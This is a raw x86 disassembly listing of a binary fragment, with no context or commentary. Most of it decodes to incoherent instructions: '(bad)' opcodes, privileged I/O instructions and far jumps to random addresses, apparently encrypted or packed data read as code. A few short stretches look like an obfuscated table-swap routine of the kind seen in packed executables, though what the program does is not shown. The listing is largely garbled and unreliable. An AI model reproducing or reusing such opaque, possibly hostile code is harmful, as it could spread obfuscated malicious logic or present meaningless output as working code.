  40c074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c075:	jno    0x40c0ac
  40c077:	sub    edi,DWORD PTR [ebx]
  40c079:	test   eax,0xd2fa670b
  40c07e:	dec    esi
  40c07f:	jle    0x40c002
  40c081:	neg    DWORD PTR [edi]
  40c083:	mov    bl,0x2f
  40c085:	xchg   edi,eax
  40c086:	sti    
  40c087:	iret   
  40c088:	in     eax,dx
  40c089:	popa   
  40c08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c08b:	sub    al,0xd9
  40c08d:	stos   BYTE PTR es:[edi],al
  40c08e:	and    BYTE PTR [ecx-0x57db8fad],ch
  40c094:	mov    eax,ds:0xd8a1c5ef
  40c099:	sub    ebp,DWORD PTR [eax-0x3ca749a5]
  40c09f:	sahf   
  40c0a0:	dec    esp
  40c0a1:	stc    
  40c0a2:	imul   DWORD PTR [edx]
  40c0a4:	sub    eax,0x4962d085
  40c0a9:	in     al,dx
  40c0aa:	out    dx,eax
  40c0ab:	dec    ecx
  40c0ac:	cli    
  40c0ad:	shl    bh,0xc0
  40c0b0:	pop    ecx
  40c0b1:	ins    DWORD PTR es:[edi],dx
  40c0b2:	xchg   DWORD PTR [esi+0x7c],ebp
  40c0b5:	lahf   
  40c0b6:	cld    
  40c0b7:	and    BYTE PTR [ebp-0x3c2c3191],dl
  40c0bd:	out    0x86,al
  40c0bf:	push   es
  40c0c0:	pop    esp
  40c0c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0c2:	mov    DWORD PTR [ebx+0x43f7e2b3],ecx
  40c0c8:	mov    ebx,0xe887b84d
  40c0cd:	inc    DWORD PTR [edx]
  40c0cf:	dec    eax
  40c0d0:	hlt    
  40c0d1:	push   cs
  40c0d2:	shl    BYTE PTR [edi+0x4d957f29],cl
  40c0d8:	and    eax,ebx
  40c0da:	rcr    BYTE PTR [edx-0x5e],1
  40c0dd:	sti    
  40c0de:	outs   dx,DWORD PTR ds:[esi]
  40c0df:	add    DWORD PTR [ebx+0x4a08e7d6],0xffffffea
  40c0e6:	jle    0x40c080
  40c0e8:	adc    edi,DWORD PTR [eax]
  40c0ea:	nop
  40c0eb:	mov    edx,DWORD PTR [ebp-0x3c]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	ds mov ax,bx
  40c144:	pop    esi
  40c145:	pop    eax
  40c146:	cs mov esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c17d
  40c150:	xchg   edi,eax
  40c151:	lahf   
  40c152:	inc    edx
  40c153:	icebp  
  40c154:	sub    ch,BYTE PTR [esi-0x24]
  40c157:	mov    BYTE PTR [edx],cl
  40c159:	sub    BYTE PTR [esi-0x442d9961],ch
  40c15f:	cmovs  esi,DWORD PTR [edi+ebx*4]
  40c163:	mov    edx,0xef32afc0
  40c168:	jne    0x40c1b0
  40c16a:	scas   al,BYTE PTR es:[edi]
  40c16b:	stos   DWORD PTR es:[edi],eax
  40c16c:	mov    ecx,0xd672525
  40c171:	push   edx
  40c172:	sti    
  40c173:	aad    0x6a
  40c175:	xor    BYTE PTR [ecx-0x45],dh
  40c178:	xor    al,0x3a
  40c17a:	add    DWORD PTR [ebx+0x1b],edi
  40c17d:	push   edx
  40c17e:	or     eax,0x7ce1a000
  40c183:	mov    ss,WORD PTR [eax]
  40c185:	popa   
  40c186:	repz jns 0x40c141
  40c189:	fwait
  40c18a:	push   ebx
  40c18b:	inc    edi
  40c18c:	and    eax,0x38c022b2
  40c191:	sti    
  40c192:	xor    BYTE PTR [ebp-0x74],ah
  40c195:	popa   
  40c196:	mov    ecx,0x4867d22a
  40c19b:	and    eax,0x94ab8a83
  40c1a0:	mov    ?,WORD PTR [eax+0x66]
  40c1a3:	jle    0x40c1b7
  40c1a5:	mov    esi,0x2adfce29
  40c1aa:	lods   al,BYTE PTR ds:[esi]
  40c1ab:	shl    DWORD PTR [ebp-0x27],cl
  40c1ae:	dec    eax
  40c1af:	and    al,0x3b
  40c1b1:	sbb    bh,BYTE PTR [eax-0x3219f0ce]
  40c1b7:	mov    eax,ds:0x74ad4e86
  40c1bc:	cs addr16 mov ebp,0xb4107525
  40c1c3:	or     BYTE PTR [eax+eiz*8+0x3596e096],ah
  40c1ca:	mov    ecx,0xd41eeae4
  40c1cf:	pop    ebx
  40c1d0:	in     eax,0xd9
  40c1d2:	and    al,0x1d
  40c1d4:	or     BYTE PTR ds:0x6a96e2e7,dh
  40c1da:	sbb    DWORD PTR [eax+edx*8-0x5d78ccc4],eax
  40c1e1:	and    bh,BYTE PTR [eax-0x693438bd]
  40c1e7:	sub    edi,0x1a
  40c1ea:	pop    esi
  40c1eb:	add    DWORD PTR [edx],esi
  40c1ed:	push   edi
  40c1ee:	pusha  
  40c1ef:	or     al,0xd2
  40c1f1:	mov    edx,0xed21fc7e
  40c1f6:	xchg   edi,eax
  40c1f7:	pop    es
  40c1f8:	pop    edx
  40c1f9:	es jnp 0x40c196
  40c1fc:	mov    dl,0x9c
  40c1fe:	dec    ebx
  40c1ff:	jmp    0x40c261
  40c201:	jne    0x40c1c6
  40c203:	jp     0x40c207
  40c205:	aas    
  40c206:	add    dl,cl
  40c208:	jno    0x40c1d9
  40c20a:	loop   0x40c236
  40c20c:	test   eax,0xd0fc57f1
  40c211:	jbe    0x40c28c
  40c213:	sub    DWORD PTR [eax+esi*1],eax
  40c216:	cwde   
  40c217:	dec    edx
  40c218:	repnz arpl sp,cx
  40c21b:	pxor   mm4,QWORD PTR [esi-0x4e]
  40c21f:	call   0x853abc3c
  40c224:	retf   0x558f
  40c227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c228:	xchg   edi,eax
  40c229:	leave  
  40c22a:	(bad)
  40c22d:	push   0xffffff99
  40c22f:	call   FWORD PTR [esp+ecx*8+0x48]
  40c233:	inc    edi
  40c234:	out    dx,eax
  40c235:	mov    ?,WORD PTR [ebp+0x63]
  40c238:	dec    ebx
  40c239:	xlat   BYTE PTR ds:[ebx]
  40c23a:	push   ecx
  40c23b:	xchg   BYTE PTR [edi+0x7bcdbaa9],ch
  40c241:	stos   BYTE PTR es:[edi],al
  40c242:	test   edi,eax
  40c244:	or     eax,0x53a86f38
  40c249:	xchg   DWORD PTR ds:0x7fa02dfa,edi
  40c24f:	push   eax
  40c250:	mov    edx,0x8dc82cba
  40c255:	or     dh,dh
  40c257:	das    
  40c258:	retf   
  40c259:	xchg   ebx,eax
  40c25a:	clc    
  40c25b:	cli    
  40c25c:	adc    cl,BYTE PTR [edi+0x477fffc6]
  40c262:	push   ebp
  40c263:	mov    esp,0x41b34dd2
  40c268:	push   0x12
  40c26a:	inc    ebx
  40c26b:	push   ecx
  40c26c:	(bad)  
  40c26d:	int3   
  40c26e:	or     eax,0xec3dea13
  40c273:	cs enter 0xa851,0x7b
  40c278:	ds in  eax,dx
  40c27a:	mov    cl,0x8f
  40c27c:	(bad)  
  40c27d:	jb     0x40c2e9
  40c27f:	cwde   
  40c280:	(bad)  
  40c281:	aam    0x58
  40c283:	adc    eax,0x3185253d
  40c288:	arpl   dx,ax
  40c28a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c28b:	xchg   ebp,eax
  40c28c:	push   ecx
  40c28d:	jnp    0x40c301
  40c28f:	test   eax,0x62bbf563
  40c294:	test   BYTE PTR [edi+0x15654c26],dh
  40c29a:	mov    ds:0x4f6f2899,eax
  40c29f:	popf   
  40c2a0:	pop    es
  40c2a1:	aam    0x5e
  40c2a3:	xor    esp,DWORD PTR [ebp+0x6dc3066d]
  40c2a9:	cs inc eax
  40c2ab:	loope  0x40c271
  40c2ad:	push   ecx
  40c2ae:	pop    ebp
  40c2af:	in     al,0xe4
  40c2b1:	pop    ss
  40c2b2:	mov    esi,0xf30e344b
  40c2b7:	mov    esp,0x5c537f19
  40c2bc:	pop    es
  40c2bd:	sub    ah,BYTE PTR [ebx-0x65]
  40c2c0:	inc    ebp
  40c2c1:	clc    
  40c2c2:	xchg   esi,eax
  40c2c3:	pop    esi
  40c2c4:	sti    
  40c2c5:	cmp    bl,BYTE PTR [esi+0x2]
  40c2c8:	lock stos DWORD PTR es:[edi],eax
  40c2ca:	push   ds
  40c2cb:	sahf   
  40c2cc:	(bad)  
  40c2cd:	pop    eax
  40c2ce:	xor    DWORD PTR [esi+0x72],edi
  40c2d1:	sub    edx,esp
  40c2d3:	imul   ecx,edx,0xffffffe7
  40c2d6:	push   0x24
  40c2d8:	adc    al,0x52
  40c2da:	pop    ss
  40c2db:	cs cwde 
  40c2dd:	push   ss
  40c2de:	cmp    eax,0xef1b43e2
  40c2e3:	jle    0x40c2e6
  40c2e5:	ins    BYTE PTR es:[edi],dx
  40c2e6:	bound  edi,QWORD PTR [esi-0x22]
  40c2e9:	or     esp,0x44
  40c2ec:	data16 in al,0x13
  40c2ef:	xchg   edx,eax
  40c2f0:	sub    eax,0xb10f11a2
  40c2f5:	xchg   ecx,eax
  40c2f6:	pop    eax
  40c2f7:	rol    DWORD PTR [edx-0x7a98a729],0x40
  40c2fe:	stos   BYTE PTR es:[edi],al
  40c2ff:	dec    esi
  40c300:	call   0x466a:0x3f543e97
  40c307:	inc    edi
  40c308:	gs cmp ecx,edx
  40c30b:	sbb    BYTE PTR [esi],ah
  40c30d:	pop    ebx
  40c30e:	xchg   edi,eax
  40c30f:	jb     0x40c35d
  40c311:	jno    0x40c307
  40c313:	outs   dx,BYTE PTR ds:[esi]
  40c314:	(bad)  
  40c315:	jae    0x40c2bb
  40c317:	data16 jg 0x40c313
  40c31a:	push   ss
  40c31b:	or     eax,0x276703c7
  40c320:	fucomp st(3)
  40c322:	xchg   BYTE PTR [eax-0x7e172b8],dl
  40c328:	mov    eax,ds:0x90dc20f2
  40c32d:	ficomp WORD PTR [eax-0x46c04e3d]
  40c333:	out    dx,eax
  40c334:	inc    eax
  40c335:	dec    ebp
  40c336:	xor    eax,0xbc7a3584
  40c33b:	and    ah,BYTE PTR [esi-0x460dc0f8]
  40c341:	or     DWORD PTR [edx],esi
  40c343:	jmp    0xead5:0x25673ddb
  40c34a:	je     0x40c352
  40c34c:	jge    0x40c386
  40c34e:	mov    ecx,DWORD PTR [ecx+0x3de5c934]
  40c354:	ds call 0x5f2e31ae
  40c35a:	outs   dx,BYTE PTR ds:[esi]
  40c35b:	jnp    0x40c364
  40c35d:	dec    esp
  40c35e:	aas    
  40c35f:	dec    ebx
  40c360:	and    al,0x2b
  40c362:	daa    
  40c363:	out    dx,al
  40c364:	int    0x4e
  40c366:	or     eax,0x8e483a91
  40c36b:	pop    esp
  40c36c:	shl    DWORD PTR [edi-0x14],0x8b
  40c370:	imul   esi,DWORD PTR [eax],0x67
  40c373:	add    edi,DWORD PTR [ecx]
  40c375:	push   edx
  40c376:	xchg   ecx,eax
  40c377:	dec    ebx
  40c378:	jle    0x40c300
  40c37a:	lods   al,BYTE PTR ds:[esi]
  40c37b:	rcr    BYTE PTR [edi+ebp*8],1
  40c37e:	dec    edi
  40c37f:	lea    ebx,[eax]
  40c381:	fs inc eax
  40c383:	xchg   edx,eax
  40c384:	xchg   edx,eax
  40c385:	and    ah,ch
  40c387:	daa    
  40c388:	sub    ecx,ebx
  40c38a:	(bad)  
  40c38b:	jmp    0x602b:0x637aa884
  40c392:	fsubr  st(2),st
  40c394:	cli    
  40c395:	enter  0xafa2,0xed
  40c399:	add    al,0xc
  40c39b:	icebp  
  40c39c:	ja     0x40c3a5
  40c39e:	and    DWORD PTR [ecx-0x49d23dc5],eax
  40c3a4:	in     eax,dx
  40c3a5:	xchg   ebx,eax
  40c3a6:	mov    ebx,0x20632399
  40c3ab:	jae    0x40c3cb
  40c3ad:	cmc    
  40c3ae:	loope  0x40c3da
  40c3b0:	sub    eax,0xa4e5946f
  40c3b5:	push   eax
  40c3b6:	cmp    ebp,DWORD PTR [ebp-0x66c250e9]
  40c3bc:	sti    
  40c3bd:	push   ebx
  40c3be:	dec    edx
  40c3bf:	mov    bl,0x8d
  40c3c1:	in     eax,0x88
  40c3c3:	mov    ds:0x8b6df818,al
  40c3c8:	cmc    
  40c3c9:	sbb    al,0x1c
  40c3cb:	fdivr  QWORD PTR [ebx]
  40c3cd:	push   es
  40c3ce:	dec    eax
  40c3cf:	mov    ch,0x4f
  40c3d1:	stos   BYTE PTR es:[edi],al
  40c3d2:	mov    bl,ah
  40c3d4:	jl     0x40c417
  40c3d6:	xor    ecx,DWORD PTR [ebx+0x31]
  40c3d9:	push   0xcfae4715
  40c3de:	mov    eax,ds:0xbd45387e
  40c3e3:	fucomip st,st(4)
  40c3e5:	aaa    
  40c3e6:	in     al,dx
  40c3e7:	push   0x39897ea1
  40c3ec:	imul   ebp,DWORD PTR [ebp-0x48],0x314cefa9
  40c3f3:	repz pop eax
  40c3f5:	shl    ebx,0x6c
  40c3f8:	ins    BYTE PTR es:[edi],dx
  40c3f9:	push   edi
  40c3fa:	inc    esp
  40c3fb:	mov    ah,0x4c
  40c3fd:	sbb    esp,DWORD PTR [ecx-0x1cd425f3]
  40c403:	icebp  
  40c404:	xchg   edi,eax
  40c405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c406:	in     eax,0xa8
  40c408:	cmp    eax,0x59675d3
  40c40d:	in     al,dx
  40c40e:	nop
  40c40f:	push   edx
  40c410:	jmp    0x5d6b9ecc
  40c415:	push   0x2df0a598
  40c41a:	or     BYTE PTR [ebx],ah
  40c41c:	ret    0x210d
  40c41f:	push   0x6708ec21
  40c424:	pop    edx
  40c425:	outs   dx,BYTE PTR ds:[esi]
  40c426:	mov    dl,0x7f
  40c428:	call   0x8ed6c27f
  40c42d:	dec    eax
  40c42e:	or     ebx,0x5c7de28d
  40c434:	jne    0x40c438
  40c436:	push   esi
  40c437:	and    BYTE PTR [ebp-0x4205f238],bh
  40c43d:	(bad)  
  40c43f:	into   
  40c440:	add    bl,bl
  40c442:	out    0x9e,eax
  40c444:	xor    DWORD PTR [eax+0x1a],edi
  40c447:	cld    
  40c448:	ss jns 0x40c3d6
  40c44b:	jmp    0x37bdd177
  40c450:	addr16 pusha 
  40c452:	icebp  
  40c453:	nop
  40c454:	push   es
  40c455:	bound  edi,QWORD PTR ds:0x2e236b80
  40c45b:	rcl    BYTE PTR [eax],1
  40c45d:	jae    0x40c3ec
  40c45f:	sub    BYTE PTR [esi],ah
  40c461:	lds    esp,FWORD PTR [edi+ebx*1]
  40c464:	xchg   ebp,eax
  40c465:	pop    ebx
  40c466:	sbb    dh,ah
  40c468:	retf   
  40c469:	push   0xffffff97
  40c46b:	cmp    al,0x9c
  40c46d:	fbstp  TBYTE PTR [eax-0x112fad50]
  40c473:	inc    esp
  40c474:	jb     0x40c401
  40c476:	inc    edx
  40c477:	push   ebp
  40c478:	jle    0x40c495
  40c47a:	retf   
  40c47b:	nop
  40c47c:	pop    edi
  40c47d:	int    0xf0
  40c47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c480:	rcl    BYTE PTR [edx-0x2ee8c3f2],0x58
  40c487:	jb     0x40c44d
  40c489:	fld    TBYTE PTR [esi+esi*8]
  40c48c:	sbb    al,bh
  40c48e:	mov    dl,0xb
  40c490:	gs retf 0xddc5
  40c494:	neg    DWORD PTR [esi+esi*2]
  40c497:	sbb    DWORD PTR [edi-0x1824abbf],edi
  40c49d:	daa    
  40c49e:	sub    eax,0xc9549519
  40c4a3:	mov    eax,0xc11d1f65
  40c4a8:	jmp    0x3235:0x5da4ed43
  40c4af:	mov    edi,0x437ccadd
  40c4b4:	ror    dh,cl
  40c4b6:	aas    
  40c4b7:	adc    edi,0x75
  40c4ba:	push   ecx
  40c4bb:	add    cl,bh
  40c4bd:	(bad)  
  40c4be:	fstp   TBYTE PTR [ecx+eiz*4-0x1c]
  40c4c2:	js     0x40c498
  40c4c4:	fdivr  QWORD PTR [ebx]
  40c4c6:	add    esp,DWORD PTR ds:0x951b291a
  40c4cc:	jmp    0x40c4a9
  40c4ce:	adc    dh,ch
  40c4d0:	cld    
  40c4d1:	outs   dx,BYTE PTR ds:[esi]
  40c4d2:	sbb    eax,eax
  40c4d4:	xlat   BYTE PTR ds:[ebx]
  40c4d5:	jno    0x40c477
  40c4d7:	and    DWORD PTR [ebp-0x5336b76f],eax
  40c4dd:	daa    
  40c4de:	ins    BYTE PTR es:[edi],dx
  40c4df:	stos   BYTE PTR es:[edi],al
  40c4e0:	xchg   ebx,eax
  40c4e1:	cmp    eax,0xe0d95450
  40c4e6:	loop   0x40c52b
  40c4e8:	mov    DWORD PTR [ecx+eiz*1+0x64],eax
  40c4ec:	lods   eax,DWORD PTR ds:[esi]
  40c4ed:	xor    cl,bh
  40c4ef:	fs xor edx,eax
  40c4f2:	add    edx,DWORD PTR [ebp-0x14]
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	loopne 0x40c51b
  40c542:	shl    eax,cl
  40c544:	dec    ebp
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c55c
  40c54d:	xor    ch,ch
  40c54f:	xor    eax,0x3abf7966
  40c554:	mov    ds:0xed248ddf,al
  40c559:	add    bl,BYTE PTR [eax]
  40c55b:	jae    0x40c581
  40c55d:	or     eax,0xfe7504cd
  40c562:	cmp    DWORD PTR [edi+eax*2],edx
  40c565:	icebp  
  40c566:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40c568:	(bad)  
  40c56a:	or     DWORD PTR [ebp+0x55953e8b],ebp
  40c570:	jecxz  0x40c4f7
  40c572:	(bad)
  40c575:	dec    edi
  40c576:	jb     0x40c5de
  40c578:	sub    eax,0x4e545868
  40c57d:	dec    edx
  40c57e:	rol    BYTE PTR [ecx],1
  40c580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c581:	mov    ah,0xc5
  40c583:	pushf  
  40c584:	mov    edx,0xea410c9a
  40c589:	ds sub edi,0x3a
  40c58d:	or     BYTE PTR [edi+0x48088eab],0xac
  40c594:	stc    
  40c595:	pop    esp
  40c596:	sub    cl,BYTE PTR [ebp+0x7f5402a3]
  40c59c:	mov    ebp,0x5a55e325
  40c5a1:	ror    BYTE PTR [edi],0x8f
  40c5a4:	jnp    0x40c599
  40c5a6:	rcr    DWORD PTR [ebp+0x737f9a23],cl
  40c5ac:	ret    
  40c5ad:	(bad)  
  40c5ae:	jb     0x40c5e9
  40c5b0:	test   DWORD PTR [esi-0x268f6873],eax
  40c5b6:	dec    ebp
  40c5b7:	loope  0x40c5d5
  40c5b9:	test   BYTE PTR [edx+0x764515ac],0xda
  40c5c0:	add    dl,dl
  40c5c2:	lods   eax,DWORD PTR ds:[esi]
  40c5c3:	jp     0x40c5f4
  40c5c5:	jp     0x40c5a4
  40c5c7:	mov    edx,0x33b740e3
  40c5cc:	test   BYTE PTR [edi+0xf],al
  40c5cf:	in     al,0x7f
  40c5d1:	jb     0x40c5a2
  40c5d3:	sbb    DWORD PTR [ebx+0x20c740a4],edx
  40c5d9:	(bad)  
  40c5da:	ror    ah,0xe1
  40c5dd:	xchg   esp,eax
  40c5de:	ret    0x8693
  40c5e1:	jge    0x40c659
  40c5e3:	add    al,0xf6
  40c5e5:	icebp  
  40c5e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5e7:	sub    edx,edx
  40c5e9:	int3   
  40c5ea:	jae    0x40c665
  40c5ec:	stos   BYTE PTR es:[edi],al
  40c5ed:	jmp    FWORD PTR fs:[esi-0x12]
  40c5f1:	push   edi
  40c5f2:	in     eax,0xb1
  40c5f4:	int3   
  40c5f5:	xchg   al,bh
  40c5f7:	xchg   esp,eax
  40c5f8:	xchg   ebp,eax
  40c5f9:	dec    edi
  40c5fa:	call   DWORD PTR [edx]
  40c5fc:	daa    
  40c5fd:	cwde   
  40c5fe:	jmp    0x40c5fd
  40c600:	inc    edi
  40c601:	rcl    dh,cl
  40c603:	mov    ebx,DWORD PTR [edi+0x32]
  40c606:	(bad)  
  40c607:	fcmovne st,st(4)
  40c609:	iret   
  40c60a:	idiv   dl
  40c60c:	xchg   esp,eax
  40c60d:	leave  
  40c60e:	shl    BYTE PTR ds:0x5c92d8ca,cl
  40c614:	inc    ebp
  40c615:	push   es
  40c616:	mov    ecx,0x3602590f
  40c61b:	fidivr DWORD PTR [esp+edi*4-0xc3a7f63]
  40c622:	jae    0x40c669
  40c624:	or     DWORD PTR [ecx],eax
  40c626:	iret   
  40c627:	fimul  DWORD PTR [ecx+0x4d]
  40c62a:	test   al,0x5d
  40c62c:	adc    dl,BYTE PTR [ebp-0x4b]
  40c62f:	or     al,0xd5
  40c631:	mov    dl,0xf2
  40c633:	repz scas al,BYTE PTR es:[edi]
  40c635:	fist   DWORD PTR [ebx-0x34]
  40c638:	push   edi
  40c639:	push   esp
  40c63a:	xor    esp,eax
  40c63c:	ins    BYTE PTR es:[edi],dx
  40c63d:	pusha  
  40c63e:	sub    edi,esi
  40c640:	ja     0x40c5cb
  40c642:	ins    DWORD PTR es:[edi],dx
  40c643:	stos   BYTE PTR es:[edi],al
  40c644:	sbb    BYTE PTR [ebx],0x35
  40c647:	xchg   BYTE PTR [ebp-0x25],bh
  40c64a:	xchg   esi,eax
  40c64b:	xor    DWORD PTR [edi+0x5f],esi
  40c64e:	sub    ecx,DWORD PTR [esp+eax*4-0x483343c8]
  40c655:	ins    DWORD PTR es:[edi],dx
  40c656:	stos   DWORD PTR es:[edi],eax
  40c657:	jb     0x40c630
  40c659:	jmp    0xf129:0x856c8e0c
  40c660:	mov    ecx,0xc0e19b58
  40c665:	or     DWORD PTR [esi+0xe],0x67ba93f
  40c66c:	dec    edx
  40c66d:	popa   
  40c66e:	mov    ds:0x62756baa,eax
  40c673:	sbb    edx,DWORD PTR [eax+0x2e40c121]
  40c679:	out    dx,eax
  40c67a:	fst    QWORD PTR ds:0x293dc214
  40c680:	(bad)  
  40c682:	cwde   
  40c683:	and    al,0xe0
  40c685:	call   0xffc3b0e3
  40c68a:	push   esp
  40c68b:	mov    WORD PTR [ecx+0x2c],?
  40c68e:	push   0x53
  40c690:	or     BYTE PTR [ebx-0x7c31b95d],bl
  40c696:	sahf   
  40c697:	js     0x40c62f
  40c699:	ja     0x40c64c
  40c69b:	sbb    ebx,ebx
  40c69d:	(bad)  
  40c69e:	idiv   DWORD PTR [edi-0x4b62e6b1]
  40c6a4:	adc    al,0x99
  40c6a6:	ret    
  40c6a7:	add    eax,0xb2e14173
  40c6ac:	cwde   
  40c6ad:	(bad)  
  40c6af:	lock or ah,BYTE PTR [ecx-0x48]
  40c6b3:	or     bl,BYTE PTR [eax-0x3f]
  40c6b6:	mov    eax,ds:0x433345c0
  40c6bb:	test   DWORD PTR [eax],edx
  40c6bd:	sbb    eax,0x9fc4534e
  40c6c2:	leave  
  40c6c3:	inc    edi
  40c6c4:	sbb    ecx,DWORD PTR [eax+0x10]
  40c6c7:	mov    dh,0xff
  40c6c9:	inc    edx
  40c6ca:	bound  ecx,QWORD PTR [ebp-0x41eedd67]
  40c6d0:	enter  0xe3dd,0xc9
  40c6d4:	aaa    
  40c6d5:	or     al,0x6e
  40c6d7:	xchg   ebp,eax
  40c6d8:	mov    ebx,0xde85ee07
  40c6dd:	sub    DWORD PTR [ecx],ebp
  40c6df:	xchg   edi,eax
  40c6e0:	out    dx,al
  40c6e1:	ret    
  40c6e2:	add    esp,DWORD PTR [ebx-0x7f]
  40c6e5:	ins    DWORD PTR es:[edi],dx
  40c6e6:	loop   0x40c69e
  40c6e8:	imul   esp,DWORD PTR [eax-0x16],0x37451a50
  40c6ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6f0:	div    BYTE PTR [esi]
  40c6f2:	ds jae 0x40c6fd
  40c6f5:	or     dh,BYTE PTR [ebx]
  40c6f7:	les    ecx,FWORD PTR [ecx-0x72e754e2]
  40c6fd:	adc    bh,dh
  40c6ff:	cmp    esi,edx
  40c701:	push   esp
  40c702:	mov    esp,0x873e01a3
  40c707:	sub    eax,0x2e781bed
  40c70c:	sti    
  40c70d:	mov    ds:0xbdd3dc5b,ax
  40c713:	dec    DWORD PTR [esi]
  40c715:	cmp    eax,0x8dbcc581
  40c71a:	dec    ebx
  40c71b:	push   es
  40c71c:	lock inc ecx
  40c71e:	sub    DWORD PTR [ebx-0x2b118a0],0x44c12c5d
  40c728:	or     eax,0xe6a7ed33
  40c72d:	cld    
  40c72e:	dec    esi
  40c72f:	jl     0x37aa02fc
  40c735:	xor    ah,BYTE PTR [eax-0x80]
  40c738:	int    0x51
  40c73a:	sub    eax,0x1134cb5
  40c73f:	xor    ah,bh
  40c741:	add    ebx,DWORD PTR [eax-0x1]
  40c744:	(bad)  
  40c745:	repnz test eax,0x9cf61e51
  40c74b:	add    ebx,DWORD PTR [eax-0x461edd]
  40c751:	dec    edx
  40c752:	xchg   BYTE PTR [edx+0x461901b1],dh
  40c758:	test   BYTE PTR [ebp-0x44ca1288],dl
  40c75e:	inc    BYTE PTR [edx]
  40c760:	and    cl,BYTE PTR [edx]
  40c762:	or     DWORD PTR [ecx],edx
  40c764:	std    
  40c765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c766:	mov    ds:0x5fccc937,al
  40c76b:	repz aaa 
  40c76d:	mov    ds:0xed6f49ac,eax
  40c772:	pop    ds
  40c773:	or     DWORD PTR [esi+0x7c],ebx
  40c776:	xchg   DWORD PTR [ebx],esp
  40c778:	sar    bh,cl
  40c77a:	jmp    0xf2633829
  40c77f:	mov    ch,0xc1
  40c781:	pop    ebp
  40c782:	call   0xe296:0x3695db70
  40c789:	push   0x74
  40c78b:	ret    0x7734
  40c78e:	cmp    ah,BYTE PTR [ebx]
  40c790:	sbb    ebp,DWORD PTR [ebx]
  40c792:	les    ecx,FWORD PTR [esi]
  40c794:	ja     0x40c7ad
  40c796:	(bad)  
  40c797:	or     BYTE PTR [edi],bh
  40c799:	out    0xe6,eax
  40c79b:	add    edx,DWORD PTR [edx-0x130658a7]
  40c7a1:	sbb    ebx,DWORD PTR [edi]
  40c7a3:	leave  
  40c7a4:	scas   eax,DWORD PTR es:[edi]
  40c7a5:	lods   al,BYTE PTR ds:[esi]
  40c7a6:	sub    bh,BYTE PTR [edx-0x4412c9a0]
  40c7ac:	or     esp,0xffffffa8
  40c7af:	test   DWORD PTR ds:0x27d49c1d,0xe767a8e8
  40c7b9:	sub    eax,0x9522589b
  40c7be:	enter  0xd837,0x64
  40c7c2:	and    al,0x27
  40c7c4:	jae    0x40c804
  40c7c6:	sar    DWORD PTR [esi-0x48bca892],0x9e
  40c7cd:	(bad)  
  40c7ce:	sub    ah,BYTE PTR [ebx+edx*2]
  40c7d1:	sub    eax,0x8b7e02f3
  40c7d6:	shl    BYTE PTR [ebp+eiz*1-0x5c05331f],cl
  40c7dd:	cmp    DWORD PTR [ebx+eax*4],esp
  40c7e0:	mov    ebx,0x87009626
  40c7e5:	push   0xb
  40c7e7:	and    BYTE PTR ds:0x881e6f17,dl
  40c7ed:	xchg   ebp,ecx
  40c7ef:	aaa    
  40c7f0:	(bad)  [ebx]
  40c7f2:	fwait
  40c7f3:	in     eax,0x66
  40c7f5:	mov    ds:0x9d172142,eax
  40c7fa:	mov    edx,0xdffae99c
  40c7ff:	xchg   ebx,eax
  40c800:	inc    esi
  40c801:	jp     0x40c794
  40c803:	pusha  
